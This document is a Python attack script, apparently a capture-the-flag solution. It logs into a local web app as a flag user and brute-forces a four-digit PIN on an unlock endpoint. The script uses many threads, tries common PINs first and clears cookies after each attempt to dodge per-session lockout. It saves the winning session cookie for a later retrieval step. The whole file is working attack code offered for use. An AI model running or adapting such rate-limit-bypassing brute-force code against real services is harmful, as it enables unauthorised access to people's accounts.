#!/usr/bin/env python3
import concurrent.futures as cf
import requests,sys,time,threading

BASE=(sys.argv[1] if len(sys.argv)>1 else 'http://127.0.0.1:5000').rstrip('/')
USER='superdiscreetflaguser'; PASSWORD='password123'
s=requests.Session()
r=s.post(BASE+'/login',data={'username':USER,'password':PASSWORD},allow_redirects=False,timeout=10)
if r.status_code != 302:
    raise SystemExit(f'login failed: {r.status_code}')
cookie=s.cookies.get('session')
print('[+] login cookie obtained',flush=True)
local=threading.local()
def guess(n):
    if not hasattr(local,'s'):
        local.s=requests.Session()
        local.s.headers['Cookie']='session='+cookie
    pin=f'{n:04d}'
    try:
        r=local.s.post(BASE+'/account/unlisted/unlock',data={'pin':pin},allow_redirects=False,timeout=15)
        # Each request must retain the pristine pre-attempt cookie.
        local.s.cookies.clear()
        if r.status_code != 403:
            return n,r.status_code,r.headers.get('Location'),r.headers.get('Set-Cookie'),r.text[:300]
    except requests.RequestException as e:
        return n,'error',None,None,str(e)
    return None
start=time.time()
workers=int(sys.argv[2]) if len(sys.argv)>2 else 12
# Put common-ish values first, then cover every remaining PIN.
common=[1337,0,1111,1234,4321,6969,7777,9999,2025,2026,1984,2001,3141,2580,8080]
order=common+[i for i in range(10000) if i not in set(common)]
with cf.ThreadPoolExecutor(max_workers=workers) as ex:
    pending={}
    it=iter(order)
    # Keep only a bounded number queued so a hit stops quickly.
    for _ in range(workers*2):
        try:
            n=next(it); pending[ex.submit(guess,n)]=n
        except StopIteration: break
    done_count=0
    while pending:
        done,_=cf.wait(pending,return_when=cf.FIRST_COMPLETED)
        for fut in done:
            n=pending.pop(fut);done_count+=1
            result=fut.result()
            if result:
                if result[1]=='error':
                    print(f'[!] {n:04d}: {result[-1]}',flush=True)
                else:
                    print(f'[+] HIT pin={n:04d}: {result}',flush=True)
                    # Store verified cookie for the retrieval step.
                    open('verified_cookie.txt','w').write(result[3] or '')
                    ex.shutdown(wait=False,cancel_futures=True)
                    raise SystemExit(0)
            if done_count%100==0:
                rate=done_count/(time.time()-start)
                print(f'[*] {done_count}/10000, {rate:.1f} guesses/s',flush=True)
            try:
                x=next(it);pending[ex.submit(guess,x)]=x
            except StopIteration: pass
print('[-] no PIN found')
